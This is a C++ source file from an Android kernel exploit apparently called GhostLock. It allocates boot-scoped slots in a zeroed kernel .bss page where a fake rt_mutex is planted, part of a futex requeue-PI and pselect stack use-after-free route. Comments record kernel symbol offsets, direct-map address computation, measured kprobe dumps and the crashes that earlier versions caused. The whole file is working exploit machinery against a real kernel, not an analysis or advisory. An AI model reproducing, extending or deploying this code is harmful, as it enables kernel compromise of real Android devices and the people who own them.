/*
 * GhostLock — the lock-anchor slot grid and its boot-scoped allocator.
 *
 * Moved out of select_stack_route.cpp unchanged (statement order, log text and
 * error numbers all preserved) when the sigreturn route became the second
 * consumer of the anchor: the region is shared kernel state, so the rotation
 * must stay one implementation. See lock_anchor.h for the contract.
 */

#include "route/lock_anchor.h"

#if defined(__ANDROID__)
#include "common.h"

#include <cstdio>
#include <string>

#include "kernel/target.h"
#include "session/exploit_session.hpp"
#include "session/runtime_paths.h"

using namespace ghostlock;

namespace ghostlock::route::anchor {
    namespace {
        /* Stride for the anchor rotation: exactly the fake rt_mutex's size.
         *
         * The object is 0x20 bytes on this build -- wait_lock 0x00 (4 bytes:
         * CONFIG_DEBUG_SPINLOCK, CONFIG_DEBUG_LOCK_ALLOC and CONFIG_PROVE_LOCKING are
         * all off in config.gz), waiters.rb_root.rb_node 0x08, waiters.rb_leftmost
         * 0x10, owner 0x18. Measured with a kprobe reading a whole 0x80 window around
         * a slot one successful run had used:
         *
         *   o00=0 o08=0xffffffc0546f3c30 o10=0xffffffc0546f3c30 o18=0
         *   o20..o78 all 0
         *
         * i.e. only rb_root and rb_leftmost are ever written, nothing reaches even
         * +0x18. Slots therefore cannot overlap at a 0x20 stride.
         *
         * The whole usable region is `dump_skip.zeroes` -- the page-sized
         * `static char zeroes[PAGE_SIZE]` in fs/coredump.c, which is only ever *read*
         * (it is the zero source for core-dump holes): image +0x2a3a590, 0x1000
         * bytes, 128 slots. It is boxed in by live neighbours -- `mb_entry_cache`,
         * `lease_notifier_chain` and `blocked_hash` before it, `core_uses_pid`
         * immediately after the page, and kernfs's live printk continuation buffer
         * (`kernfs_pr_cont_lock`/`kernfs_pr_cont_buf`) +0x340 past the end -- so an
         * index past the end MUST be refused: the walk would take a live kernel
         * variable for a lock.
         *
         * Two of those neighbour facts were wrong when this comment was first
         * written, and `ghostlock-extract --anchor-scan` is what corrected them: the
         * extent is exactly 0x1000 (the next symbol is `core_uses_pid`), not the
         * 0x1344 a coarser symbol list suggested, and kernfs is not what sits
         * immediately past the page. The refusal itself is unchanged -- what it
         * protects is the same -- but the reason is now derived rather than
         * remembered. */
        /* All three numbers are properties of ONE kernel build, so all three come
         * from the profile (`route.<name>.lock_anchor_{image,bytes,stride}`).
         * They used to be compile-time constants here, which made the byte count --
         * a symbol layout -- and the stride -- `sizeof(struct rt_mutex)` under this
         * kernel's lock-debug config -- into facts you could only change by editing
         * and rebuilding the exploit. The offset was already a key; a bound that
         * ships separately from the offset it bounds is how a profile ends up
         * walking past its own region.
         *
         * Absent keys keep the values below, which are this build's. */
        constexpr uintptr_t kLockAnchorStrideDefault = 0x20;
        constexpr uintptr_t kLockAnchorBytesDefault = 0x1000;
        /* The fake rt_mutex reaches through `owner` at +0x18, so no two slots can be
         * closer than 0x20 whatever the kernel config: a smaller stride makes two
         * slots share a word and the walk then corrupts both, with no symptom until
         * a later descent. */
        constexpr uintptr_t kLockAnchorStrideMin = 0x20;

        /* Resolve the grid from the profile. Returns false when the two keys cannot
         * describe one: the caller must then fail the route rather than fall back to
         * a neighbour or to the defaults, because a profile that says something
         * contradictory must not be half-honoured. */
        bool geometry_from(const std::optional<uint64_t> &bytes_key,
                           const std::optional<uint64_t> &stride_key,
                           Geometry *out) {
            const uintptr_t stride = stride_key
                                         ? static_cast<uintptr_t>(*stride_key)
                                         : kLockAnchorStrideDefault;
            const uintptr_t bytes = bytes_key
                                        ? static_cast<uintptr_t>(*bytes_key)
                                        : kLockAnchorBytesDefault;
            if (stride < kLockAnchorStrideMin || bytes == 0 || bytes % stride != 0) {
                pr_error("[route] anchor geometry unusable (bytes=0x%llx stride=0x%llx): bytes must be a "
                         "non-zero multiple of the stride, and the stride at least 0x%llx -- the fake "
                         "rt_mutex reaches owner@+0x18, so closer slots share a word\n",
                         static_cast<unsigned long long>(bytes),
                         static_cast<unsigned long long>(stride),
                         static_cast<unsigned long long>(kLockAnchorStrideMin));
                return false;
            }
            out->stride = stride;
            out->bytes = bytes;
            out->slots = bytes / stride;
            return true;
        }

        bool read_boot_id(char *out, size_t capacity) {
            FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
            if (!f) return false;
            const bool ok = fgets(out, static_cast<int32_t>(capacity), f) != nullptr;
            fclose(f);
            if (!ok) return false;
            for (size_t i = 0; out[i] != '\0'; i++) {
                if (out[i] == '\n') {
                    out[i] = '\0';
                    break;
                }
            }
            return out[0] != '\0';
        }

        /* Reserve `next_slot` by persisting it BEFORE the slot is handed out: the
         * reservation is what keeps a later process from being given the same slot
         * again. fflush is enough for that -- the page cache is what the next
         * process reads, and a kernel-level loss means a reboot, which changes the
         * boot id and resets the region anyway.
         *
         * The slot *grid* is stamped alongside it. A build with a different stride or
         * region (this one moved 0x80 -> 0x40 -> 0x20 in a single session) numbers the
         * same bytes differently, so a file written by another grid must not be
         * resumed: slot 1 of a 0x80 grid is slots 0-3 of a 0x20 grid. A mismatch is
         * treated like an unusable file, i.e. it refuses until a reboot. */
        bool write_anchor_state(const std::string &path, const char *boot_id,
                                uintptr_t next_slot, uintptr_t slots) {
            FILE *f = fopen(path.c_str(), "w");
            if (!f) return false;
            const int32_t written = fprintf(f, "%s %llu %llu\n", boot_id,
                                            static_cast<unsigned long long>(next_slot),
                                            static_cast<unsigned long long>(slots));
            const bool ok = written > 0 && fflush(f) == 0;
            fclose(f);
            return ok;
        }

        /* Boot-scoped slot allocator, monotonic across *processes*. Returns a slot in
         * [0, geometry.slots), or geometry.slots when this boot has no pristine
         * slot left -- the caller must then fail the route instead of walking a
         * neighbour.
         *
         * Why the serial cannot be process-local, and why it cannot be the attempt
         * index either: the anchor is NOT private memory. The requeue path enqueues
         * the fake waiter into lock->waiters (rb_add_cached sets waiters.rb_leftmost),
         * and that waiter lives in the pselect stack frame of the *waiter thread*
         * (race::waiter_thread parks on FUTEX_WAIT_REQUEUE_PI and then runs the route
         * controller, which is what makes the freed waiter and the fd_set buffer the
         * same memory). That thread exits when the stage attempt ends, so the slot is
         * left holding a pointer into a freed kernel stack -- vmap'ed, hence unmapped
         * on free. The next walk that reaches the slot dereferences it in
         * rt_mutex_top_waiter()'s BUG_ON(w->lock != lock) *before* it can re-enqueue
         * anything, and data-aborts at rt_mutex_adjust_prio_chain+0x3f0
         * (ESR 0x96000007, pte=0, x27 = the anchor).
         *
         * Measured 2026-10-09 with a kprobe reading the anchor's boot-invariant
         * direct map (0xffffff802aa3a590):
         *   freshly booted, idle      -> wl=0 root=0 lmost=0 owner=0
         *   after one successful run  -> wl=0 root=0xffffffc05778bc30
         *                                     lmost=0xffffffc05778bc30 owner=0
         *
         * So one run poisons the slots it used for the rest of the boot, and a
         * process-local serial handed the next run slot 0 again. That is the measured
         * cause of 4/4 deaths in the first dance of every run that followed a
         * completed run (the oops kills a task holding a kernel lock, the resulting
         * spin starves gh-watchdog and the SoC resets). The first run after a reboot
         * always worked because .bss is zeroed at boot, so rb_leftmost is NULL and
         * rt_mutex_top_waiter() returns before the BUG_ON. */
        /* Slots reserved per state-file write.
         *
         * The reservation used to be written once per attempt, i.e. ~12 file writes
         * per healthy run (5 stages, one or two attempts each). That I/O sits in the
         * route's setup path, and setup-path work is exactly what the attempt-1
         * requeue window is sensitive to -- every stage in the first post-fix series
         * failed its first attempt, which the per-attempt write is a candidate
         * explanation for. Reserving a chunk instead costs one write per chunk and
         * nothing on the attempts in between.
         *
         * The safety property is unchanged: the chunk's END is persisted before any
         * slot in it is handed out, so a later process can never be given a slot this
         * one used. A process that dies mid-chunk only *skips* the rest of its chunk
         * (waste bounded by kLockAnchorChunk - 1 slots out of 128). 8 keeps that
         * bounded while cutting a healthy run to at most 2 writes. */
        constexpr uintptr_t kLockAnchorChunk = 8;

        uintptr_t allocate_slot(const Geometry &geom) {
            static bool loaded = false;
            static char boot_id[64] = {};
            static std::string state_path;
            static uintptr_t next = 0;      /* next slot to hand out */
            static uintptr_t reserved = 0;  /* high-water mark already in the file */
            static uintptr_t loaded_slots = 0;

            if (loaded && loaded_slots != geom.slots) {
                /* One profile per process, so this cannot happen today. It is
                 * checked because the state file records a grid: honouring a second
                 * grid against a high-water mark computed for the first would hand
                 * out slots that are not where the file says they are. */
                pr_error("[route] anchor geometry changed mid-process (%llu -> %llu slots); "
                         "refusing to reuse this boot's slot state\n",
                         static_cast<unsigned long long>(loaded_slots),
                         static_cast<unsigned long long>(geom.slots));
                return geom.slots;
            }

            if (!loaded) {
                loaded = true;
                loaded_slots = geom.slots;
                state_path = config::anchor_state_file(config::runtime_config_snapshot().home_dir);
                if (!read_boot_id(boot_id, sizeof boot_id)) {
                    /* Not fatal: without a boot id we fall back to comparing the
                     * sentinel with itself, i.e. "same boot", which is the
                     * conservative reading of an unreadable /proc. */
                    std::strncpy(boot_id, "unknown-boot", sizeof boot_id - 1);
                }

                char stored_boot[64] = {};
                unsigned long long stored_next = 0;
                unsigned long long stored_slots = 0;
                bool have_boot = false;
                bool have_all = false;
                if (FILE *f = fopen(state_path.c_str(), "r")) {
                    /* The boot id alone is authoritative; the rest is only meaningful
                     * within the boot that wrote it, so an older writer's file (say
                     * one without the grid field) still gets its boot id honoured. */
                    have_boot = fscanf(f, "%63s", stored_boot) == 1;
                    if (have_boot) {
                        have_all = fscanf(f, "%llu %llu", &stored_next, &stored_slots) == 2;
                    }
                    fclose(f);
                }
                const bool same_boot = have_boot && std::strcmp(stored_boot, boot_id) == 0;
                const bool grid_ok = have_all && stored_slots == geom.slots;

                if (same_boot && grid_ok && stored_next <= geom.slots) {
                    next = static_cast<uintptr_t>(stored_next);
                    pr_info("[route] anchor slots: %llu/%llu already spent this boot\n",
                            static_cast<unsigned long long>(next),
                            static_cast<unsigned long long>(geom.slots));
                } else if (have_boot && !same_boot) {
                    /* A different boot id is proof the region was re-zeroed (.bss is
                     * zeroed at boot), so slot 0 is pristine again whatever the rest
                     * of the file says -- including a file from an older format. */
                    pr_info("[route] anchor slots: new boot, region zeroed again; "
                            "starting at 0/%llu\n",
                            static_cast<unsigned long long>(geom.slots));
                } else if (same_boot && have_all) {
                    /* Same boot, untrustworthy grid or count: the region is still
                     * poisoned and this file cannot say where the high-water mark is.
                     * Refuse rather than guess. */
                    pr_error("[route] anchor state is not usable for this build "
                             "(grid %llu vs %llu, next %llu); reboot the device and run again\n",
                             stored_slots, static_cast<unsigned long long>(geom.slots),
                             stored_next);
                    next = geom.slots;
                } else if (config::runtime_config_snapshot().anchor_trusted) {
                    /* No file, but the app proved this install's data predates the
                     * boot: any run this boot would have written the file, so its
                     * absence proves the region is still zeroed and slot 0 is safe.
                     * Without the flag this case used to be a dead end -- the file
                     * is written only after this check passes, so a clean install
                     * could never create one, and a reboot could not either. The
                     * flag is withheld when the install postdates the boot, because
                     * then a previous install's runs may have poisoned the region
                     * and a reboot really is the only fix. */
                    if (!write_anchor_state(state_path, boot_id, 0, geom.slots)) {
                        pr_error("[route] anchor slot state is missing and cannot be created in %s; "
                                 "refusing to start from a slot this boot may already have spent\n",
                                 state_path.c_str());
                        next = geom.slots;
                    } else {
                        pr_info("[route] anchor slots: no state file and this install predates the "
                                "boot; starting at 0/%llu\n",
                                static_cast<unsigned long long>(geom.slots));
                    }
                } else {
                    /* No usable reservation file, and there is NO safe guess: which
                     * slots this boot already spent is unknowable (a clean reinstall
                     * mid-boot loses the file while .bss stays poisoned -- measured
                     * 2026-10-09, that guess cost a reboot), and 0 is the one slot a
                     * previous run is guaranteed to have used. Refuse and say what
                     * fixes it; a reboot re-zeroes the whole region. */
                    pr_error("[route] anchor slot state missing/unusable (%s); cannot tell which "
                             "slots this boot already spent -- reboot the device and run again\n",
                             state_path.c_str());
                    next = geom.slots;
                }
            }

            if (next >= geom.slots) return geom.slots;
            if (next >= reserved) {
                /* First call in this process, or the chunk is spent: persist the end
                 * of the next chunk BEFORE handing out any slot from it. A failed
                 * write leaves `reserved` where it was, so the next attempt retries
                 * rather than handing out an unrecorded slot. */
                uintptr_t want = next + kLockAnchorChunk;
                if (want > geom.slots) want = geom.slots;
                if (!write_anchor_state(state_path, boot_id, want, geom.slots)) {
                    pr_error("[route] cannot record the anchor slot reservation in %s; refusing to "
                             "hand out a slot a later process would be given again\n",
                             state_path.c_str());
                    return geom.slots;
                }
                reserved = want;
                pr_info("[route] anchor slots: reserved %llu..%llu of %llu\n",
                        static_cast<unsigned long long>(next),
                        static_cast<unsigned long long>(reserved - 1),
                        static_cast<unsigned long long>(geom.slots));
            }
            return next++;
        }
    } // namespace

    std::uintptr_t acquire_lock_word(const std::uint64_t image,
                                     const std::optional<std::uint64_t> bytes,
                                     const std::optional<std::uint64_t> stride,
                                     const int32_t attempt,
                                     std::uintptr_t *slot_out) noexcept {
        *slot_out = 0;
        Geometry geom = {};
        if (!geometry_from(bytes, stride, &geom)) return 0;
        const uintptr_t slot = allocate_slot(geom);
        *slot_out = slot;
        if (slot >= geom.slots) {
            pr_error("[route] anchor slot budget for this boot is spent (%llu slots of "
                     "0x%llx bytes at stride 0x%llx, one per attempt); refusing to walk "
                     "past the zeroed region into live .bss -- reboot to reset it\n",
                     static_cast<unsigned long long>(geom.slots),
                     static_cast<unsigned long long>(geom.bytes),
                     static_cast<unsigned long long>(geom.stride));
            return 0;
        }
        const uintptr_t rotation = geom.stride * slot;
        const uintptr_t lock_word = session::g_exploit_session.addresses.data_alias(
            static_cast<uintptr_t>(kernel::KIMAGE_TEXT_BASE + image) + rotation);
        pr_info("[route] lock anchor: image +0x%llx (attempt %d, slot %llu, "
                "+0x%llx) -> direct map 0x%llx\n",
                static_cast<unsigned long long>(image), attempt,
                static_cast<unsigned long long>(slot),
                static_cast<unsigned long long>(rotation),
                static_cast<unsigned long long>(lock_word));
        return lock_word;
    }
} // namespace ghostlock::route::anchor
#endif // __ANDROID__
